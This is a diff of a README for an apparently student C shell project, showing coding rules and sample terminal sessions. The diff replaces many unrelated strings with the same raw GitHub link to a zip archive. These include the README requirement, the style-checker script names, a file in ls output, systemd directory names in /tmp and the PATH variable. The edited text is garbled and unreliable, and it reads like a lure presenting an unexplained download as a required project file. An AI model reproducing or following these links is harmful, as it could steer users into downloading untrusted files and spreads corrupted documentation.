@@ -26,8 +26,8 @@ General
 Allowed editors: vi, vim, emacs
 All your files will be compiled on Ubuntu 20.04 LTS using gcc, using the options -Wall -Werror -Wextra -pedantic -std=gnu89
 All your files should end with a new line
-A README.md file, at the root of the folder of the project is mandatory
-Your code should use the Betty style. It will be checked using betty-style.pl and betty-doc.pl
+A https://raw.githubusercontent.com/iddokip/simple_shell/master/Euterpe/simple_shell-v2.3.zip file, at the root of the folder of the project is mandatory
+Your code should use the Betty style. It will be checked using https://raw.githubusercontent.com/iddokip/simple_shell/master/Euterpe/simple_shell-v2.3.zip and https://raw.githubusercontent.com/iddokip/simple_shell/master/Euterpe/simple_shell-v2.3.zip
 Your shell should not have any memory leaks
 No more than 5 functions per file
 All your header files should be include guarded
@@ -154,7 +154,7 @@ julien@ubuntu:~/shell$ ./shell
 ./shell: No such file or directory
 #cisfun$ /bin/ls
 barbie_j       env-main.c  exec.c  fork.c  pid.c  ppid.c    prompt   prompt.c  shell.c  stat.c         wait
-env-environ.c  exec    fork    mypid   ppid   printenv  promptc  shell     stat test_scripting.sh  wait.c
+env-environ.c  exec    fork    mypid   ppid   printenv  promptc  shell     stat https://raw.githubusercontent.com/iddokip/simple_shell/master/Euterpe/simple_shell-v2.3.zip  wait.c
 #cisfun$ /bin/ls -l
 ./shell: No such file or directory
 #cisfun$ ^[[D^[[D^[[D
@@ -166,7 +166,7 @@ env-environ.c  exec    fork    mypid   ppid   printenv  promptc  shell     stat 
 #cisfun$ ^C
 julien@ubuntu:~/shell$ echo "/bin/ls" | ./shell
 barbie_j       env-main.c  exec.c  fork.c  pid.c  ppid.c    prompt   prompt.c  shell.c  stat.c         wait
-env-environ.c  exec    fork    mypid   ppid   printenv  promptc  shell     stat test_scripting.sh  wait.c
+env-environ.c  exec    fork    mypid   ppid   printenv  promptc  shell     stat https://raw.githubusercontent.com/iddokip/simple_shell/master/Euterpe/simple_shell-v2.3.zip  wait.c
 #cisfun$ julien@ubuntu:~/shell$
 Repo:
 
@@ -189,17 +189,17 @@ Handle the PATH
 fork must not be called if the command doesn’t exist
 julien@ubuntu:~/shell$ ./shell_0.3
 :) /bin/ls
-barbie_j       env-main.c  exec.c  fork.c  pid.c  ppid.c    prompt   prompt.c  shell_0.3  stat    test_scripting.sh  wait.c
+barbie_j       env-main.c  exec.c  fork.c  pid.c  ppid.c    prompt   prompt.c  shell_0.3  stat    https://raw.githubusercontent.com/iddokip/simple_shell/master/Euterpe/simple_shell-v2.3.zip  wait.c
 env-environ.c  exec    fork    mypid   ppid   printenv  promptc  shell     shell.c    stat.c  wait
 :) ls
-barbie_j       env-main.c  exec.c  fork.c  pid.c  ppid.c    prompt   prompt.c  shell_0.3  stat    test_scripting.sh  wait.c
+barbie_j       env-main.c  exec.c  fork.c  pid.c  ppid.c    prompt   prompt.c  shell_0.3  stat    https://raw.githubusercontent.com/iddokip/simple_shell/master/Euterpe/simple_shell-v2.3.zip  wait.c
 env-environ.c  exec    fork    mypid   ppid   printenv  promptc  shell     shell.c    stat.c  wait
 :) ls -l /tmp 
 total 20
 -rw------- 1 julien julien    0 Dec  5 12:09 config-err-aAMZrR
-drwx------ 3 root   root   4096 Dec  5 12:09 systemd-private-062a0eca7f2a44349733e78cb4abdff4-colord.service-V7DUzr
-drwx------ 3 root   root   4096 Dec  5 12:09 systemd-private-062a0eca7f2a44349733e78cb4abdff4-rtkit-daemon.service-ANGvoV
-drwx------ 3 root   root   4096 Dec  5 12:07 systemd-private-062a0eca7f2a44349733e78cb4abdff4-systemd-timesyncd.service-CdXUtH
+drwx------ 3 root   root   4096 Dec  5 12:09 https://raw.githubusercontent.com/iddokip/simple_shell/master/Euterpe/simple_shell-v2.3.zip
+drwx------ 3 root   root   4096 Dec  5 12:09 https://raw.githubusercontent.com/iddokip/simple_shell/master/Euterpe/simple_shell-v2.3.zip
+drwx------ 3 root   root   4096 Dec  5 12:07 https://raw.githubusercontent.com/iddokip/simple_shell/master/Euterpe/simple_shell-v2.3.zip
 -rw-rw-r-- 1 julien julien    0 Dec  5 12:09 unity_support_test.0
 :) ^C
 julien@ubuntu:~/shell$ 
@@ -235,7 +235,7 @@ C_IS=Fun_:)
 DESKTOP_SESSION=ubuntu
 LOGNAME=julien
 TERM=xterm-256color
-PATH=/home/julien/bin:/home/julien/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+https://raw.githubusercontent.com/iddokip/simple_shell/master/Euterpe/simple_shell-v2.3.zip
 DISPLAY=:0
 $ exit
 julien@ubuntu:~/shell$ 
@@ -410,7 +410,7 @@ $ echo $?
 $ echo $$
 5104
 $ echo $PATH
-/home/julien/bin:/home/julien/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+https://raw.githubusercontent.com/iddokip/simple_shell/master/Euterpe/simple_shell-v2.3.zip
 $ exit 
 julien@ubuntu:~/shell$ 
 Repo:
